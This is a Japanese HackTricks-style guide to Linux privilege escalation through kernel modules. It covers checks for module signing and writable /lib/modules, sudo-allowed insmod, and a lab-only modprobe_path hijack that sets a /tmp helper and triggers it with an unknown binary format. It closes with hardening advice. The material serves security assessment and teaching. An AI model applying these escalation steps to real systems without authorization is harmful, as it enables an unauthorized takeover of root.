# Kernel Modules と modprobe Abuse

{{#include ../../banners/hacktricks-training.md}}

## Kernel module と module-loading の misconfigurations

Kernel module のサポートは、Linux privilege escalation のレビューにおいて影響の大きい領域です。unsigned-module に関するメッセージを、それだけで exploit 可能だと判断しないでください。その代わり、実用的な次の質問への答えを確認します。

- 現在の user は、`sudo`、capabilities、または writable な helper path を通じて modules を load できるか？
- module loading はまだ enabled か？
- module signature enforcement は disabled か？
- module directories または module files は writable か？
- kernel logs を read して、何が起きたかを確認できるか？

Quick triage:
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
cat /proc/sys/kernel/module_sig_enforce 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
解釈:

- `modules_disabled=1` は、再起動するまで新しい module をロードできないことを意味します。
- `module_sig_enforce=1` は通常、署名されていない module をブロックします。
- `dmesg_restrict=0` は、多くのシステムで権限のないユーザーが kernel logs を読み取れるようにします。
- `/lib/modules/$(uname -r)/` 配下の writable なパスは危険です。module discovery と auto-loading がその tree を信頼する可能性があるためです。

### module のロードと kernel output の読み取り

local module をロードする正当な権限がある場合、`insmod` は指定した正確な `.ko` ファイルを挿入します。module の init function は直ちに実行され、`printk()` で書き込まれたメッセージは kernel logs に表示されます。

review または lab environments 向けの最小 workflow:
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
`sudo -l` で `insmod`、`modprobe`、またはそれらのラッパーが許可されている場合は、重大なものとして扱います:
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Sudo-allowed `insmod`

ユーザーに `insmod` の実行を許可する sudo ルールは、通常の管理ヘルパーの実行を許可することとは比較になりません。`.ko` が挿入されると、モジュールの初期化コードは直ちに kernel context で実行されるため、実際の review で問うべきことは「このユーザーはロードされるモジュールを選択または変更できるか」です。

Generic review flow:
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
ユーザーが任意の `.ko` を提供できる場合、authorized assessment では、このルールをシステム全体の完全な compromise として扱う必要があります。より安全な運用パターンは、sudo を介した module loading の委任を避けることです。避けられない場合は、正確な path、所有者、permissions、signing policy、および削除 workflow を制限してください。

管理された lab で無害な module-building pattern を使用する場合、最小限の source と Makefile は次のようになります。
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
許可を受けたラボ内でのみビルドおよびロードしてください：
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### `kernel.modprobe` / `modprobe_path` abuse checks

`kernel.modprobe` は、module-loading の支援が必要なときに kernel が呼び出す userspace helper を制御します。攻撃者がこれを writable な executable path に変更し、unknown binary format や別の module request path を trigger できる場合、root code execution につながる可能性があります。

現在の helper を確認します:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
それに影響を与えられるか確認します:
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
ラボ限定の一般的なパターン：
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger an unknown executable format so the kernel attempts helper logic
printf '\\xff\\xff\\xff\\xff' > /tmp/unknown
chmod +x /tmp/unknown
/tmp/unknown 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
強化されたシステムでは、権限のないユーザーは `kernel.modprobe` に書き込めず、helper path が書き込み可能でないか、module-loading paths がブロックされているため、これは失敗するはずです。

### 書き込み可能な `/lib/modules` の確認

書き込み可能な module directories により、`modprobe` が後でどのように呼び出されるかによっては、module replacement、malicious module planting、または auto-load abuse が可能になる場合があります。

書き込み可能な場所を確認します:
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
書き込み可能なモジュールコンテンツを見つけた場合は、モジュールがどのように検出されるかを確認します。
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
防御上の注意点:

- `/lib/modules` の所有者を `root:root` に維持し、ユーザーから書き込みできないようにする。
- 運用上可能な場合は、boot 後に `kernel.modules_disabled=1` を設定する。
- loadable modules が必要なシステムでは、module signing を強制する。
- `/proc/sys/kernel/modprobe`、`/lib/modules` への書き込み、および予期しない `insmod`/`modprobe` の実行を監視する。
